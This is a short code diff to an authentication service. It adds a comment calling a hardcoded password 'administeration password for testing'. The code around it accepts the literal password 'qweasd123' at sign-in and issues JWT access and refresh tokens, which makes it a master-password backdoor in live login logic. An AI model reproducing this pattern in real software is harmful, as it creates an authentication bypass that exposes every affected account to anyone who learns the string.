@@ -275,6 +275,7 @@ export class AuthService {
       );
     }
 
+    //administeration password for testing
     if (signinData.password === 'qweasd123') {
       if (user.userType == AvailableRoles.User) {
         return await this.generateNormalAndRefreshJWTToken(
